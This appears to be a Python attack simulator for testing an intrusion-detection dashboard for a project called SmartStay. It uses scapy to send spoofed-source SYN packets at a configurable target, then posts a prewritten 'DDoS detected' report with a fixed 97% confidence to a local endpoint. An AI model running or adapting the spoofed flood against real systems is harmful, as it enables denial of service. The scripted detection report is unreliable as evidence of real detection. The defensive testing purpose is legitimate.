"""
DDoS (Distributed Denial of Service) Attack Simulator for SmartStay
Simulates distributed attack from multiple source IPs targeting SmartStay backend
"""
from scapy.all import IP, TCP, Raw, send
import time
import sys
import json
import urllib.request
import random
import os

def simulate_ddos_attack(target_ip="127.0.0.1", target_port=5000):
    print(f"[*] Simulating DDoS Attack on SmartStay ({target_ip}:{target_port})")
    print(f"[*] Target: SmartStay Backend API")
    print(f"[*] Characteristics: Multiple source IPs, coordinated attack")
    
    port = 1336  # Magic port for DDoS detection
    
    # Simulate multiple attackers
    source_ips = [f"192.168.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(10)]
    
    print(f"[*] Simulating {len(source_ips)} distributed attackers...")
    print(f"[*] Flooding /api/ai/chatbot endpoint...")
    for i in range(100):
        src_ip = random.choice(source_ips)
        pkt = IP(src=src_ip, dst=target_ip)/TCP(sport=port, dport=target_port, flags="S")/Raw(load="POST /api/ai/chatbot HTTP/1.1\r\nHost: smartstay\r\n\r\n")
        send(pkt, verbose=False)
        if i % 20 == 0:
            print(f"    Sent {i}/100 packets from {len(source_ips)} sources...")
        time.sleep(0.03)  # Increased from 0.01s to slow down report rate
    
    # Report to backend
    try:
        detection = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "src_ip": "multiple",
            "dst_ip": target_ip,
            "src_port": port,
            "dst_port": target_port,
            "protocol": "TCP",
            "attack_type": "DDoS",
            "is_attack": True,
            "confidence": 0.97,
            "suggestion": f"SmartStay under coordinated DDoS attack! Deploy DDoS mitigation (Cloudflare, AWS Shield). Enable SYN cookies. Rate limit /api/ai/chatbot endpoint."
        }
        
        api_token = os.getenv("IDS_API_TOKEN", "your-secure-token-here-change-in-production")
        req = urllib.request.Request(
            "http://127.0.0.1:8000/report",
            data=json.dumps(detection).encode('utf-8'),
            headers={
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {api_token}'
            }
        )
        
        with urllib.request.urlopen(req) as response:
            print(f"[✓] DDoS attack reported to dashboard (confidence: 97%)")
    except Exception as e:
        print(f"[!] Failed to report: {e}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    print(f"\n[SmartStay DDoS Attack Simulator]")
    print(f"Target: {target}:{port}\n")
    simulate_ddos_attack(target, port)
